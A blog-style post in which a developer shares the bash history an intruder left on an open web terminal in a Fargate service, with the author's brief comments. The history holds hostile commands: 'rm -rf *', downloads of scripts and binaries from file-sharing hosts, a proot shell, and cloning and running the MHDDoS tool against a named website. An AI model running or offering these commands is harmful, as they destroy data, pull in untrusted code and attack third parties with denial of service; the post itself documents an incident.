## Bash history of a hack attempt in one of my Fargate services

Yesterday I checked the bash history for an open [web terminal](http://github.com/yudai/gotty)
I left behind in of of the Fargate services I set up, and noticed a hack attempt.
Below you'll find the set of commands the attacker used. Typos and the constant
use of `clear` makes me think this isn't a pro, but it's still interseting to
see what he/she attempted.
 
```
   31  ls
   32  rm -rf *
   33  ls
   34  sudo
   35  ls
   36  sudo apt update
   37  clear
   38  ls
   39  screen -ls
   40  clear
   41  cd
   42  tmux
   43  clear
   44  ls
   45  cd /
   46  ls
   47  cd
   48  clear
   49  ulimit -n 999999
   50  clear
   51  wget
   52  curl
   53  docker
   54  udocker
   55  pip3
   56  curl https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip --output yt.zip
   57  screen -ls
   58  ls
   59  clear
   60  unzip yt.zip
   61  pk
   62  apk update
   63  apt
   64  apt update
   65  clear
   66  tar
   67  rm -rf *
   68  clear
   69  ls
   70  clear
   71  curl https://transfer.sh/rvpSpC/root.sh --output root.sh
   72  ls
   73  curl https://transfer.sh/A2mYNo/root.tar.xz --output root.tar.xz
   74  mkdir dist
   75  ls
   76  cd dist
   77  curl https://transfer.sh/1e30zd/proot --output proot
   78  curl https://transfer.sh/9btpPw/proot.md5sum --output proot.md5sum
   79  curl https://transfer.sh/6wqMgI/proot.sha256sum --output proot.sha256sum
   80  clear
   81  cd
   82  ls
   83  tar -xvf root.tar.xz
   84  clear
   85  ./dist/proot -S . /bin/bash
   86  chmod +x ./dist/proot
   87  ./dist
   88  ./dist/proot -S . /bin/bash
   89  ls
   90  rm -rf root.sh
   91  m -rf root.tar.xz
   92  rm -rf root.tar.xz
   93  ls
   94  cd
   95  ls
   96  clear
   97  cd /
   98  ls
   99  cd
  100  ls
  101  cd dist
  102  ls
  103  rm -rf *
  104  cd /
  105  rm -rf dist
  106  clear
  107  ls
  108  cd
  109  pip3 install udocker
  110  udocker install
  111  pip3 remove udocker
  112  pip3 uninstall udocker
  113  clear
  114  curl https://github.com/indigo-dc/udocker/releases/download/v1.3.1/udocker-1.3.1.tar.gz --output udocker-1.3.1.tar.gz
  115  ls
  116  cd
  117  ls
  118  tar zxvf udocker-1.3.1.tar.gz
  119  ls
  120  clear
  121  curl https://transfer.sh/ce6sc1/udocker.tar.gz --output udocker.tar.gz
  122  tar -xvf udocker.tar.gz
  123  ls
  124  rm -rf udocker*
  125  ls
  126  clear
  127  ls
  128  git
  129  git clone https://github.com/MHProDev/MHDDoS
  130  cd MHDDoS
  131  ls
  132  pip3 install -r requirements.txt
  133  cdlls
  134  cd
  135  ls
  136  cd MHDDoS
  137  ls
  138  cd
  139  ls
  140  cd MHDDoS
  141  python3 start.py get https://host.applelife.ru/ 1 1000 http.txt 1000 9999999999999999999999999999
  142  history
```

I don't recomment visiting these URLs, or trying these commands on your system.
However, <https://github.com/MHProDev/MHDDoS> is safe. It's a DDOS Attack script
implemented in Python. The attaker was able to install it, and used it to DDOS
`https://host.applelife.ru/`.

After noticing it, I removed the configuration that enables the web terminal and
restarted the service to get back to a healthy/safe state.

FWIW, I know that leaving an open web terminal isn't safe. This is not the first
time I got an intruder there, but the previous one just poked around and didn't
attempt anything nefarious. Anyway, YOLO - these web terminals are pretty
convinient. And since there's very little an attacker can do in the running
container, I feel the risk is manageable.
